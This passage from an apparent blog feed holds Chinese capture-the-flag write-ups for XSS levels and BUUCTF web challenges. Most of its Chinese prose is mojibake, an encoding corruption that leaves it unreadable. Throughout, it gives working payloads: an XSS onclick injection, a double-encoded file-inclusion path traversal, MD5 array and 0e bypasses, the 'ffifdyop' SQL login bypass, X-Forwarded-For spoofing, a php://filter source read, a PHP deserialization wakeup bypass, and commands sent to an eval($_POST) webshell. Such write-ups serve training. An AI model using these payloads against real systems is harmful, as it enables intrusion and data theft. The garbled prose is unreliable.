å…¥,è§‚å¯Ÿä¸€ä¸‹å‘ç°è¿™ä¸ªembed  æ ‡ç­¾å°±æ˜¯å¼•å…¥ä¸€ä¸ª  swf  æ–‡ä»¶åˆ°æµè§ˆå™¨ç«¯ï¼Œå¹¶ä¸”å®ƒçš„  src  å±æ€§å€¼æ²¡æœ‰æ·» </p><p>  åŠ å¼•å·æ‰€ä»¥ ä¸ç”¨é—­åˆã€‚ </p><p>æ„é€ payload     â€˜ Î¿nclick&#x3D;alert() <img src="https://img-blog.csdnimg.cn/direct/be82d9feca8f41d5ab6ae37fd01d6c57.png" alt="img"></p><h2 id="level-18â€”â€“åŒ17"><a href="#level-18â€”â€“åŒ17" class="headerlink" title="level-18â€”â€“åŒ17"></a>level-18â€”â€“åŒ17</h2><h2 id="level-19â€”â€“Pass"><a href="#level-19â€”â€“Pass" class="headerlink" title="level-19â€”â€“Pass"></a>level-19â€”â€“Pass</h2><h2 id="level-20â€”â€“Pass"><a href="#level-20â€”â€“Pass" class="headerlink" title="level-20â€”â€“Pass"></a>level-20â€”â€“Pass</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF</title>
    <link href="/kele6.github.io/2024/04/14/XYCTF/"/>
    <url>/kele6.github.io/2024/04/14/XYCTF/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘æ˜¯èœé¸Ÿé¸Ÿ</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/kele6.github.io/2024/04/14/BUUCTF/"/>
    <url>/kele6.github.io/2024/04/14/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="HCTF-2018-WarmUp-ä»£ç å®¡è®¡"><a href="#HCTF-2018-WarmUp-ä»£ç å®¡è®¡" class="headerlink" title="[HCTF 2018]WarmUp(ä»£ç å®¡è®¡)"></a>[HCTF 2018]WarmUp(ä»£ç å®¡è®¡)</h2><p>æºä»£ç &#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;<strong>flag not here, and flag in ffffllllaaaagggg</strong>&#x3D;&#x3D;&gt;è¯´æ˜flagå¯èƒ½åœ¨æ–‡ä»¶ffffllllaaaagggg</p><p>è§£æsource.phpçš„ä»£ç <br><code>if (! empty($_REQUEST[&#39;file&#39;])       &amp;&amp; is_string($_REQUEST[&#39;file&#39;])&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;       include $_REQUEST[&#39;file&#39;];exit;&#125; else &#123;echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;&#125;</code><br>ä¸€æ­¥æ­¥è§£æï¼š<br>$_REQUEST</p><pre><code class="hljs">    å˜é‡ $_REQUESTç”¨äºæ”¶é›†HTMLè¡¨å•æäº¤çš„æ•°æ®ï¼Œé»˜è®¤æƒ…å†µä¸‹åŒ…å«äº†$_GETï¼Œ$_POSTå’Œ$_COOKIEçš„æ•°ç»„ã€‚    GETæ˜¯ä»æœåŠ¡å™¨ä¸Šè·å–æ•°æ®ï¼ŒGETæ˜¯æŠŠå‚æ•°æ•°æ®é˜Ÿåˆ—åŠ åˆ°æäº¤è¡¨å•çš„ACTIONå±æ€§æ‰€æŒ‡çš„URLä¸­ï¼Œå€¼å’Œè¡¨å•å†…å„ä¸ªå­—æ®µä¸€ä¸€å¯¹åº”ï¼Œåœ¨URLä¸­å¯ä»¥çœ‹åˆ°ã€‚    POSTæ˜¯å‘æœåŠ¡å™¨ä¼ é€æ•°æ®ï¼ŒPOSTæ˜¯é€šè¿‡HTTP POSTæœºåˆ¶ï¼Œå°†è¡¨å•å†…å„ä¸ªå­—æ®µä¸å…¶å†…å®¹æ”¾ç½®åœ¨HTML HEADERå†…ä¸€èµ·ä¼ é€åˆ°ACTIONå±æ€§æ‰€æŒ‡çš„URLåœ°å€ï¼Œç”¨æˆ·çœ‹ä¸åˆ°è¿™ä¸ªè¿‡ç¨‹ã€‚    é€šè¿‡POSTå’ŒGETæ–¹æ³•æäº¤çš„æ‰€æœ‰æ•°æ®éƒ½å¯ä»¥é€šè¿‡$_REQUEST[&quot;å‚æ•°&quot;]è·å¾—ã€‚</code></pre><p>empty()</p><pre><code class="hljs">    empty(var) å‡½æ•°ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºï¼Œå½“ å˜é‡var å­˜åœ¨ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªéç©ºéé›¶çš„å€¼æ—¶è¿”å› FALSE å¦åˆ™è¿”å› TRUEã€‚</code></pre><p>is_string()</p><pre><code class="hljs">    is_string(var)æ£€æµ‹å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœvaræ˜¯å­—ç¬¦ä¸²åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</code></pre><p>include</p><pre><code class="hljs">    includeè¯­å¥åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚    æ–‡ä»¶æŸ¥æ‰¾è¿‡ç¨‹ï¼š    1ã€è¢«åŒ…å«æ–‡ä»¶å…ˆæŒ‰å‚æ•°ç»™å‡ºçš„è·¯å¾„å¯»æ‰¾ã€‚    2ã€å¦‚æœæ²¡æœ‰ç»™å‡ºç›®å½•ï¼ˆåªæœ‰æ–‡ä»¶åï¼‰æ—¶åˆ™æŒ‰ç…§include_pathæŒ‡å®šçš„ç›®å½•å¯»æ‰¾ã€‚    3ã€å¦‚æœåœ¨include_pathä¸‹æ²¡æ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œåˆ™includeæœ€åæ‰åœ¨è°ƒç”¨è„šæœ¬æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾ã€‚    4ã€å¦‚æœæœ€åä»æœªæ‰¾åˆ°æ–‡ä»¶åˆ™includeä¼šå‘å‡ºä¸€æ¡è­¦å‘Šã€‚</code></pre><p>é€»è¾‘ç»“æ„</p><pre><code class="hljs">    ä¼ å…¥çš„fileå‚æ•°éœ€æ»¡è¶³ä»¥ä¸‹3ä¸ªæ¡ä»¶ï¼Œæ‰å¯åŒ…å«å¹¶è¿è¡Œfileï¼š    ï¼ˆ1ï¼‰ä¸ä¸ºç©º    ï¼ˆ2ï¼‰ä¸ºå­—ç¬¦ä¸²    ï¼ˆ3ï¼‰emmm::checkFile($_REQUEST[&#39;file&#39;]) è¿”å› true</code></pre><p>mb_substr()</p><pre><code class="hljs">    mb_substr ( string $str , int $start , int $length )            mb_substr() å‡½æ•°ä»$strçš„$startå­—ç¬¦ä½ç½®å¼€å§‹ï¼Œæˆªæ–­$lengthä¸ªå­—ç¬¦å¹¶è¿”å›å­—ç¬¦ä¸²ã€‚$strçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 0ï¼Œç¬¬äºŒä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 1ï¼Œä»¥æ­¤ç±»æ¨ã€‚    ç±»ä¼¼substr() å‡½æ•°ï¼Œsubstr() å‡½æ•°åªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ mb_substr()ã€‚</code></pre><p><strong>mb_strpos()</strong></p><p>â€‹    <code>mb_strpos(haystack, needle)ï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²needleåœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²haystackä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿”å›ä½ç½®(int)ã€‚ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 0ï¼Œç¬¬äºŒä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 1ï¼Œä»¥æ­¤ç±»æ¨ã€‚</code></p><p><code>$_page = mb_substr(     $page,     0,     mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); $_page = urldecode($page);</code><br><code>$_page = mb_substr(     $_page,</code><br>    <code>0,</code><br>    <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code><br><code>);</code></p><p>ifè¯­å¥ä¸­çš„$_pageç»å†äº†å¦‚ä¸‹æ”¹å˜ï¼šä¸€æ¬¡é—®å·æˆªæ–­ï¼Œä¸€æ¬¡urlè§£ç ï¼Œä¸€æ¬¡é—®å·æˆªæ–­â€”â€”â€“urlä¼ å…¥æœåŠ¡å™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urldecode.  ?çš„urlç¼–ç ä¸º%3Fï¼ŒåŒé‡urlç¼–ç ä¸º%253Fã€‚</p><p>é‚£é—®é¢˜å°±å¾ˆå®¹æ˜“è§£å†³äº†<br>payload:?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaaggggâ€”â€”-..&#x2F;ä»£è¡¨è¿”å›ä¸Šçº§ç›®å½•â€”â€”â€“..&#x2F;æ˜¯ä¸€ä¸ªä¸€ä¸ªè¯•çš„ï¼ŒæœªçŸ¥æœ‰å‡ ä¸ªæ–‡ä»¶å¤¹</p><h2 id="MRCTF2020-Ez-bypass-md5"><a href="#MRCTF2020-Ez-bypass-md5" class="headerlink" title="MRCTF2020]Ez_bypass(md5)"></a>MRCTF2020]Ez_bypass(md5)</h2><p><strong>ä»£ç å®¡è®¡</strong><br>&#x2F;&#x2F; åŒ…å«å¤–éƒ¨æ–‡<br>ä»¶ â€˜flag.phpâ€™ï¼Œè¯¥æ–‡ä»¶å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯<br>include â€˜flag.phpâ€™;<br>&#x2F;&#x2F; å®šä¹‰ä¸€ä¸ªå˜é‡ $flagï¼ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²<br>$flag &#x3D; â€˜MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}â€™;</p><p>&#x2F;&#x2F; æ£€æŸ¥æ˜¯å¦å­˜åœ¨åä¸º â€˜ggâ€™ å’Œ â€˜idâ€™ çš„ GET å‚æ•°<br>if(isset($_GET[â€˜ggâ€™]) &amp;&amp; isset($_GET[â€˜idâ€™])) {<br>    &#x2F;&#x2F; è·å– GET å‚æ•° â€˜idâ€™ å’Œ â€˜ggâ€™ çš„å€¼<br>    $id &#x3D; $_GET[â€˜idâ€™];<br>    $gg &#x3D; $_GET[â€˜ggâ€™];</p><pre><code class="hljs">// æ£€æŸ¥ $id å’Œ $gg çš„ MD5 æ•£åˆ—å€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¹¶ä¸”å®ƒä»¬çš„å€¼ä¸ç›¸ç­‰ï¼Œå¼ºæ¯”è¾ƒif (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;    // è¾“å‡º &#39;You got the first step&#39;    echo &#39;You got the first step&#39;;     // æ£€æŸ¥æ˜¯å¦å­˜åœ¨åä¸º &#39;passwd&#39; çš„ POST å‚æ•°    if(isset($_POST[&#39;passwd&#39;])) &#123;        // è·å– POST å‚æ•° &#39;passwd&#39; çš„å€¼        $passwd = $_POST[&#39;passwd&#39;];         // æ£€æŸ¥ $passwd æ˜¯å¦ä¸ºæ•°å­—        if (!is_numeric($passwd)) &#123;            // å¦‚æœ $passwd ç­‰äº 1234567ï¼Œåˆ™è¾“å‡º &#39;Good Job!&#39;ï¼Œæ˜¾ç¤º &#39;flag.php&#39; çš„å†…å®¹ï¼Œç„¶åç»ˆæ­¢è„šæœ¬æ‰§è¡Œ            if($passwd == 1234567) &#123;                echo &#39;Good Job!&#39;;                highlight_file(&#39;flag.php&#39;);                die(&#39;By Retr_0&#39;);            &#125; else &#123;                // å¦‚æœ $passwd ä¸ç­‰äº 1234567ï¼Œåˆ™è¾“å‡º &#39;can you think twice??&#39;                echo &quot;can you think twice??&quot;;            &#125;        &#125; else &#123;            // å¦‚æœ $passwd æ˜¯æ•°å­—ï¼Œåˆ™è¾“å‡º &#39;You can not get it !&#39;  å¯ä»¥æ•°å­—+å­—æ¯ å¦‚ï¼š12345a            echo &#39;You can not get it !&#39;;        &#125;    &#125; else &#123;        // å¦‚æœä¸å­˜åœ¨ POST å‚æ•° &#39;passwd&#39;ï¼Œåˆ™è¾“å‡º &#39;only one way to get the flag&#39;        die(&#39;only one way to get the flag&#39;);    &#125;&#125; else &#123;    // å¦‚æœ $id å’Œ $gg çš„ MD5 æ•£åˆ—å€¼ä¸ç›¸ç­‰ï¼Œæˆ–è€…å®ƒä»¬çš„å€¼ç›¸ç­‰ï¼Œåˆ™è¾“å‡º &#39;You are not a real hacker!&#39;    echo &quot;You are not a real hacker!&quot;;&#125;</code></pre><p>} else {<br>    &#x2F;&#x2F; å¦‚æœä¸å­˜åœ¨ â€˜ggâ€™ å’Œ â€˜idâ€™ çš„ GET å‚æ•°ï¼Œåˆ™è¾“å‡º â€˜Please input firstâ€™<br>    die(â€˜Please input firstâ€™);<br>}<br><strong>å¾ˆå¸¸è§çš„md5æ¯”è¾ƒ</strong><br><code>è‹¥ä¸ºå¼±æ¯”è¾ƒï¼š</code></p><p><code>md5åŠ å¯†åä¸º0eå¼€å¤´çš„ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®°æ•°æ³•ï¼Œç»“æœå‡ä¸º0</code></p><p><code>ä¾‹å¦‚ï¼špara1=QNKCDZO ï¼Œpara2=aabg7XSs</code></p><p><code>md5ï¼ˆpara1ï¼‰=0e830400451993494058024219903391</code></p><p><code>md5ï¼ˆpara2ï¼‰=0e087386482136013740957780965295</code></p><p><code>æ­¤æ—¶MD5ï¼ˆpara1ï¼‰== MD5ï¼ˆpara2ï¼‰</code></p><p>å¦åŠ ï¼šæ•°ç»„ç»•è¿‡&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;222</p><p><code>è‹¥ä¸ºå¼ºæ¯”è¾ƒï¼š</code></p><p><code>å¦‚æœä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•°ç»„ï¼Œmd5()å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼ï¼Œå¹¶ä¸”ä¸ä¼šæŠ¥é”™ï¼Œå°±ä¼šå¾—åˆ°===å¼ºæ¯”è¾ƒçš„å€¼ç›¸ç­‰</code></p><p><code>ä¾‹å¦‚ï¼špara1[]=111  ,  para2[]=222</code></p><p><code>æ­¤æ—¶md5ï¼ˆpara1ï¼‰=== md5ï¼ˆpara2ï¼‰</code><br>æ˜¾è€Œæ˜“è§ payloadï¼š&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;2  POST:passwd&#x3D;1234567a</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>æºä»£ç ï¼šå‘ç°ç§˜å¯†ï¼šSecret.php</p><p>It doesnâ€™t come from â€˜<a href="https://Sycsecret.buuoj.cn'==>Referer">https://Sycsecret.buuoj.cn&#39;==&gt;Referer</a></p><p>Please use â€œSycloverâ€ browser&#x3D;&#x3D;&gt;Uesr Agent </p><p>No!!! you can only read this locally!!!&#x3D;&#x3D;&gt;X-Forwarded-For: 127.0.0.1<br>(å¦å‡ ç§è¡¨è¾¾ï¼šX-Real-Ip: 127.0.0.1   Client-Ip: 127.0.0.1)</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>éšä¾¿æŸ¥è¯¢ï¼Œæ— å›å“ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°ï¼š<!-- /header end -->HTTPæœ‰header&#x3D;&#x3D;&gt;å‘ç°<em>Hint select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)</em></p><p>ä¸€ä¸ªsqlè¯­å¥ï¼Œè¦è¾“å…¥ä¸€ä¸ªå¯†ç ä½†æ˜¯å¹¶ä¸çŸ¥é“æ­£ç¡®å¯†ç ã€‚è¿™é‡Œéœ€è¦åˆ©ç”¨md5ç»•è¿‡ï¼Œè®©sqlè¯­å¥å˜æˆå¦‚ä¸‹å½¢å¼  <strong>select * from â€˜adminâ€™ where password&#x3D;â€˜â€™ or â€˜1</strong>ï¼ˆå¾ˆåŸºæœ¬çš„sqlï¼‰</p><p><a href="https://www.cnblogs.com/redfish404/articles/17878453.html">https://www.cnblogs.com/redfish404/articles/17878453.html</a></p><p>ä¸Šç½‘æŸ¥æ‰¾åå‘ç°å­—ç¬¦ä¸²â€œ<strong>ffifdyop</strong>â€å’Œâ€œ129581926211651571912466741651878684928â€åœ¨è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5åŠ å¯†</a>åå½¢æˆçš„åå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²ç»è¿‡mysqlè½¬æ¢æˆåè¿›åˆ¶åå¯¹åº”çš„ASCIIç å†…å®¹ä¸ºâ€œor â€˜ 6â€¦â€¦â€â€”â€”ffifdyop-&gt;276f722736c95d99e921722cf9ed621c-&gt;â€™orâ€™6Ã‰]Â™Ã©!r,Ã¹Ã­b</p><p>è¿›å…¥æ–°é¡µé¢ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºä»£ç </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>) == md5(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br></code></pre></td></tr></table></figure><p>å¾ˆåŸºæœ¬çš„md5&#x3D;&#x3D;&gt;0eç»•è¿‡æˆ–è€…æ•°ç»„ç»•è¿‡éƒ½è¡Œ&#x3D;&#x3D;è¿›å…¥ä¸‹ä¸€æ­¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?phperror_reporting(0);include &quot;flag.php&quot;;<br>highlight_file(__FILE__);<br>if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))<br>&#123;  echo $flag;&#125; <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåªèƒ½æ•°ç»„ç»•è¿‡&#x3D;&#x3D;&gt;param1[]&#x3D;1&amp;param2[]&#x3D;2</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File-ä¿¡æ¯æ³„éœ²ã€æ–‡ä»¶åŒ…å«"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File-ä¿¡æ¯æ³„éœ²ã€æ–‡ä»¶åŒ…å«" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File(ä¿¡æ¯æ³„éœ²ã€æ–‡ä»¶åŒ…å«)"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File(ä¿¡æ¯æ³„éœ²ã€æ–‡ä»¶åŒ…å«)</h2><p>é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºä»£ç &#x3D;&#x3D;&gt;href&#x3D;â€.&#x2F;Archive_room.phpâ€</p><p>æ‰“å¼€ï¼Œç‚¹å‡»æŒ‰é’®ï¼Œæç¤ºâ€œæ²¡çœ‹æ¸…ä¹ˆï¼Ÿå›å»å†ä»”ç»†çœ‹çœ‹å§ã€‚â€</p><p>è®©æˆ‘ä»¬é€€å›å»ä»”ç»†çœ‹çœ‹ï¼Œè¯´æ˜åœ¨è¿™ä¸¤ä¸ªé¡µé¢ä¹‹é—´å­˜åœ¨ä¸€äº›å†…å®¹ï¼Œå³é”®ã€Œæ£€æŸ¥ã€<br>è¿”å›ä¸Šä¸€ä¸ªé¡µé¢ï¼ˆArchive_room.phpï¼‰é‡æ–°ç‚¹å‡»ä¸€æ¬¡ SECRET æŒ‰é’®ï¼Œè§‚å¯Ÿè¿™ä¸€è¿‡ç¨‹æœ‰å“ªäº›ã€Œè¯·æ±‚ã€&#x3D;&#x3D;&gt;åœ¨ç»“æŸé¡µé¢ä¹‹å‰ï¼Œè¿˜è®¿é—®äº†ä¸€ä¸ªé¡µé¢&#x2F;action.phpï¼Œåªæ˜¯æˆ‘ä»¬æ²¡æœ‰ã€Œæƒé™ã€ï¼ˆ302ï¼‰ï¼Œçœ‹ä¸äº†ï¼Œæ‰€ä»¥ç›´æ¥è·³è¿‡äº†è¿™ä¸ªé¡µé¢ã€‚é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œä½¿ç”¨<a href="https://so.csdn.net/so/search?q=burp&spm=1001.2101.3001.7020">burp</a>æŠ“åŒ…è¿›è¡Œè®¿é—®<br>å‘ç°   secr3t.php   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))<br>&#123;    <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>; <br>   <span class="hljs-keyword">exit</span>();  &#125; <br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨PHPä¼ªåè®®å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œç¼–ç ï¼š&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x3D;&#x3D;&gt;base64è§£ç </p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHPï¼ˆååºåˆ—åŒ–ï¼‰"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHPï¼ˆååºåˆ—åŒ–ï¼‰" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHPï¼ˆååºåˆ—åŒ–ï¼‰"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHPï¼ˆååºåˆ—åŒ–ï¼‰</h2><p>å¤‡ä»½ç½‘ç«™&#x3D;&#x3D;&gt;dirsezrch -u <a href="http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==%3Ewww.zip%E6%96%87%E4%BB%B6(%E7%9B%B4%E6%8E%A5%E5%9C%A8url%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E6%8B%BC%E6%8E%A5%E5%B0%B1%E5%8F%AF%E4%BB%A5)">http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==&gt;www.zipæ–‡ä»¶(ç›´æ¥åœ¨urlç½‘å€åé¢æ‹¼æ¥å°±å¯ä»¥)</a></p><p>æ–‡ä»¶å¤¹æºç æŒ¨ä¸ªçœ‹</p><p>index.php<br><code>&lt;?php</code></p><p>  <code>include &#39;class.php&#39;;</code></p><p>  <code>$select = $_GET[&#39;select&#39;];</code></p><p>  <code>$res=unserialize(@$select);</code></p><p>  <code>?&gt;</code></p><p>class.php(ç»è¿‡åˆ å‡)</p><p>&lt;<code>?php</code></p><p><code>include &#39;flag.php&#39;;</code></p><p><code>class Name&#123;</code></p><p>  <code>private $username = &#39;nonono&#39;;</code></p><p><code>private $password = &#39;yesyes&#39;;</code></p><p><code>public function __construct($username,$password)&#123;</code></p><p>â€‹    <code>$this-&gt;username = $username;</code></p><p>â€‹    <code>$this-&gt;password = $password; &#125;</code></p><p> <code>function __wakeup()&#123;</code></p><p>â€‹    <code>$this-&gt;username = &#39;guest&#39;;</code></p><p>  <code>&#125;</code></p><p> <code>function __destruct()&#123;</code></p><p>â€‹    <code>if ($this-&gt;password != 100) &#123;</code></p><p>â€‹      <code>echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</code></p><p>â€‹      <code>echo &quot;You name is: &quot;;</code></p><p>â€‹      <code>echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</code></p><p>â€‹      <code>echo &quot;You password is: &quot;;</code></p><p>â€‹      <code>echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</code></p><p>â€‹      <code>die();</code></p><p>â€‹    <code>&#125;</code></p><p>â€‹    <code>if ($this-&gt;username === &#39;admin&#39;) &#123;</code></p><p>â€‹      <code>global $flag;</code></p><p>â€‹      <code>echo $flag;</code></p><p>â€‹    <code>&#125;else&#123;</code></p><p>â€‹      <code>echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;</code></p><p>â€‹      <code>die();</code></p><p>**åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå½“å‰å±æ€§ä¸ªæ•°å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œå°±ä¼šè·³è¿‡__wakeup(),å»æ‰§è¡Œ___destruct<br>æ€è·¯æ˜ç¡®äº†</p><p>å½“passwordä¸º100ï¼Œusernameä¸ºadminæ—¶å³å¯è·å¾—flag</p><p>æ•…ä»¥getä¼ å‚ä¸ºè·³æ¿æœ¬åœ°æ„é€ åŸå§‹POCï¼š</p><p>?select&#x3D;O:4:â€Nameâ€:2:{s:13:â€ Name usernameâ€;s:5:â€adminâ€;s:13:â€ Name passwordâ€;s:3:100;}</p><p>?select&#x3D;O:4:â€Nameâ€:2:{s:13:â€ Name usernameâ€;s:5:â€adminâ€;s:13:â€ Name passwordâ€;s:3:100;}<br>ä»ç„¶ä¸è¡Œ  </p><p>å¯èƒ½ç©ºæ ¼æ²¡æœ‰è¢«å®ä½“åŒ–  è¿™é‡Œæˆ‘ä»¬éœ€è¦æŠŠç©ºæ ¼å†™å‡ºæ¥<br> è€Œç©ºæ ¼çš„urlç¼–ç æ˜¯%00ï¼Œä¸‹é¢æ„é€ æˆ‘ä»¬çš„payload </p><p>?select&#x3D;O:4:â€Nameâ€:3 {s:14:â€%00Name%00usernameâ€;s:5:â€adminâ€;s:14:â€%00Name%00passwordâ€;s:3:â€100â€;}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife-ä¸€å¥è¯æœ¨é©¬ã€ä»£ç æ‰§è¡Œ"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife-ä¸€å¥è¯æœ¨é©¬ã€ä»£ç æ‰§è¡Œ" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife(ä¸€å¥è¯æœ¨é©¬ã€ä»£ç æ‰§è¡Œ)"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife(ä¸€å¥è¯æœ¨é©¬ã€ä»£ç æ‰§è¡Œ)</h2><h5 id="Way1ï¼ˆä»£ç æ‰§è¡Œï¼‰"><a href="#Way1ï¼ˆä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="Way1ï¼ˆä»£ç æ‰§è¡Œï¼‰"></a>Way1ï¼ˆä»£ç æ‰§è¡Œï¼‰</h5><p>æ˜¾ç¤º eval($_POST[â€œSycâ€]);<br>POST: Syc&#x3D;var_dump(scandir(â€˜&#x2F;â€˜));â€”æŸ¥çœ‹æºä»£ç  å‘ç°flag</p><h5 id="Way2ï¼ˆèšå‰‘ï¼‰"><a href="#Way2ï¼ˆèšå‰‘ï¼‰" class="headerlink" title="Way2ï¼ˆèšå‰‘ï¼‰"></a>Way2ï¼ˆèšå‰‘ï¼‰</h5><p>å¤åˆ¶URL å¯†ç ï¼šSyc  æ‰¾flagæ–‡ä»¶</p><h2 id="MRCTF2020-ä½ ä¼ 